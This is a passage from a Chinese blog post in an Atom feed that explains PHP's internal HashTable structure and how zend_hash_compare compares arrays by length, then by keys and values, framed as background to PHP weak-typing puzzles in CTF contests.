Z_ARR(zval)</p></blockquote><p>大概的含义是从数组中抓取hash值，<br><img src="https://i.imgur.com/q8PoRVR.png" alt=""><br>这里需要传入HashTable *ht1<br>那么HashTable 又是什么呢？</p><blockquote><p>在学数据结构的时候我们都有学到hash，<br>其实对于hashtable我之前的印象是比如python中的字典它的原理就是采取hash表，即采取键值对的方式进行查询数据，比起链表等方式查询无疑是要快的多</p></blockquote><p>那么这里的hashtable又是否和我想的一样呢？具体看<a href="http://www.php-internals.com/book/?p=chapt03/03-01-02-hashtable-in-php" target="_blank" rel="noopener">这里</a></p><blockquote><p>PHP内核中的哈希表是十分重要的数据结构，PHP的大部分的语言特性都是基于哈希表实现的， 例如：变量的作用域、函数表、类的属性、方法等，Zend引擎内部的很多数据都是保存在哈希表中的。</p></blockquote><blockquote><p>PHP中的哈希表实现在Zend/zend_hash.c中，先看看PHP实现中的数据结构， PHP使用如下两个数据结构来实现哈希表，HashTable结构体用于保存整个哈希表需要的基本信息， 而Bucket结构体用于保存具体的数据内容，如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _hashtable &#123; </span><br><span class="line">    uint nTableSize;        // hash Bucket的大小，最小为8，以2x增长。</span><br><span class="line">    uint nTableMask;        // nTableSize-1 ， 索引取值的优化</span><br><span class="line">    uint nNumOfElements;    // hash Bucket中当前存在的元素个数，count()函数会直接返回此值 </span><br><span class="line">    ulong nNextFreeElement; // 下一个数字索引的位置</span><br><span class="line">    Bucket *pInternalPointer;   // 当前遍历的指针（foreach比for快的原因之一）</span><br><span class="line">    Bucket *pListHead;          // 存储数组头元素指针</span><br><span class="line">    Bucket *pListTail;          // 存储数组尾元素指针</span><br><span class="line">    Bucket **arBuckets;         // 存储hash数组</span><br><span class="line">    dtor_func_t pDestructor;    // 在删除元素时执行的回调函数，用于资源的释放</span><br><span class="line">    zend_bool persistent;       //指出了Bucket内存分配的方式。如果persisient为TRUE，则使用操作系统本身的内存分配函数为Bucket分配内存，否则使用PHP的内存分配函数。</span><br><span class="line">    unsigned char nApplyCount; // 标记当前hash Bucket被递归访问的次数（防止多次递归）</span><br><span class="line">    zend_bool bApplyProtection;// 标记当前hash桶允许不允许多次访问，不允许时，最多只能递归3次</span><br><span class="line">#if ZEND_DEBUG</span><br><span class="line">    int inconsistent;</span><br><span class="line">#endif</span><br><span class="line">&#125; HashTable;</span><br></pre></td></tr></table></figure><p>当然如果要详细讲PHP中的hashtable讲清楚肯定要再写另一篇博客，这里我们就只讲这里所需要的原理<br><img src="https://i.imgur.com/oz6iVWs.png" alt=""><br>这里进行两个参数的判断，当两个参数hash值相等时候就返回0<br>我们可以直接看看php数组的hash，具体点<a href="https://www.jianshu.com/p/3f1d0f9907a1" target="_blank" rel="noopener">这里</a><br><img src="https://i.imgur.com/Dkm5Ix6.png" alt=""><br>这是在PHP5.6的数组结构<br>我们可以看到，数组本质就是一个hashtable结构，左侧的0~nTablemask便是hash下标，而后面有一个双向链表，便是我们通常所说的hash冲突的链地址法。<br><img src="https://i.imgur.com/hgjQdOQ.png" alt=""><br>这是PHP7.0的数组结构<br><img src="https://i.imgur.com/QOxDpIr.png" alt=""><br>Bucket结构便是我们所说的保存插入数据的结构。主要包括：key(字符串，如果是数字下标，转化位字符串), value, h(只会计算一次，如果是数组下标，直接把key作为h)。</p><p>稍稍回到原题，我们进行比较的就是Bucket结构中的hash值</p><p>那么hash值是怎么比较的呢？<br>我们查找zend_hash_compare函数到底是什么意思</p><blockquote><p>int zend_hash_compare(<br>    HashTable *ht1, HashTable *ht2, compare_func_t compar, zend_bool ordered TSRMLS_DC<br>);</p></blockquote><p>我们查询了hashtable的api具体想了解可以看<a href="http://www.phpinternalsbook.com/hashtables/hashtable_api.html" target="_blank" rel="noopener">这里</a><br>这里有一句话</p><blockquote><p>The return has the same meaning as compare_func_t. The function first compares the length of the arrays. If they differ, then the array with the larger length is considered greater. What happens when the length is the same depends on the ordered parameter:<br>For ordered=0 (not taking order into account) the function will walk through the buckets of the first hashtable and always look up if the second hashtable has an element with the same key. If it doesn’t, then the first hashtable is considered greater. If it does, then the compar function is invoked on the values.<br>For ordered=1 (taking order into account) both hashtables will be walked simultaneously. For each element first the key is compared and if it matches the value is compared using compar.<br>This is continued until either one of the comparisons returns a non-zero value (in which case the result of the comparison will also be the result of zend_hash_compare()) or until no more elements are available. In the latter case the hashtables are considered equal.</p></blockquote><p>解释一下<br>这里先会判断这两个数组参数的长度。如果它们不同，则认为具有较大长度的阵列更大<br>这也就能说明为什么我们前面的问题是恒真了吧<br><img src="https://i.imgur.com/9q0v10w.png" alt=""></p><p>当然当长度相同比如[7],与[6]<br><img src="https://i.imgur.com/NkRgIZm.png" alt=""><br>会遍历第一个数组，假如第一个数组的元素，并始终查找第二个哈希表是否具有相同键的元素。如果没有，那么第一个哈希表被认为更大，<br>看到这里大家的疑惑都解决了吧</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>通过这次探寻，我深刻发现到往往很多我们认为是常识的东西都有着很多极其复杂的原理，我们认识一件事物的时候不能仅仅只凭借表面现象就根据自己直觉来得出结论，虽然有的时候得出的结果是一样的，但是我们并不能够真正理解这个结论到底为何而来。</p><h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p>本文由安全客原创发布<br>转载，请参考转载声明，注明出处： <a href="https://www.anquanke.com/post/id/171966" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171966</a><br>安全客 - 有思想的安全新媒体</p>]]></content>
    
    <summary type="html">
    
      在CTF比赛中PHP弱类型的特性常常被用上，但我们往往知其然不知其所以然，究竟为什么PHP是弱类型呢？很少人深究。
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="PHP内核分析" scheme="https://museljh.github.io/tags/PHP%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP弱类型" scheme="https://museljh.github.io/tags/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
</feed>
